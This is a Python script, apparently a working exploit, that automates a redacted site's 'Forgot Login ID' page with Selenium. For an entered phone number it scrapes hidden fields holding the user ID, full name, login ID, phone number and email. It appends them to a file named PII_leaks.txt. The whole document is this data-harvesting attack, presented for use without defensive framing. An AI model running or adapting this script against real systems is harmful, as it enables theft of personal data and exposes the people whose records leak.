#Developed by Suneet Singh
#This Script require request, random, selenium, webdriver_manager and BeautifuSoup4 module to work; Use -- pip install --trusted-host pypi.org \ --trusted-host files.pythonhosted.org \ -r requirements.txt -- to install dependencies.


import requests
import random
import selenium
import webdriver_manager
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
def ppppppp(twov, onev, threev, fivev, fourv):
    with open('./PII_leaks.txt', 'a+') as f:               
        f.write("\n__________________________________\n")
        f.write("User ID = " + onev['value'] + '\n' + "Full Name = " + twov.text + '\n' + "Login ID = " + threev['value'] + '\n' + "Phone Number = " + fourv['value'] + '\n' + "Email = " + fivev['value'])
        f.write("\n__________________________________\n")
def exploited(pNumber):
    options = Options()
    browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
    options.add_argument("--headless=new")
    options.add_argument("--allow-running-insecure-content")
    options.accept_insecure_certs = True
    options.add_argument("--ignore-certificate-errors")
    browser = webdriver.Chrome(options=options) 
    browser.get("https://**********/YYYYY/ForgotLoginID.aspx")
    # browser.maximize_window()
    mobile_number = browser.find_element(By.ID, "txtEmployeeCode")
    mobile_number.send_keys(pNumber)
    Search = browser.find_element(By.XPATH, value="//div/input[@value='Search']")
    Search.click()
    html_source=browser.page_source
    y = html_source
    soup = BeautifulSoup(y, 'html.parser')
    twov = soup.find('span',  attrs={"id": "ContentPlaceHolderTop_lblFullName"})
    fourv = soup.find('input',  attrs={"id": "ContentPlaceHolderTop_hdnContactNo"})
    onev = soup.find('input', attrs={"id": "ContentPlaceHolderTop_hdnUserId"})
    threev = soup.find('input', attrs={"id": "ContentPlaceHolderTop_hdnLoginId"})
    fivev = soup.find('input', attrs={"id": "ContentPlaceHolderTop_hdnEmailId"})
    ppppppp(twov, onev, threev, fivev, fourv)

if __name__ == '__main__':
    pNumber = int(input("Enter the phone number: \n"))
    exploited(pNumber)
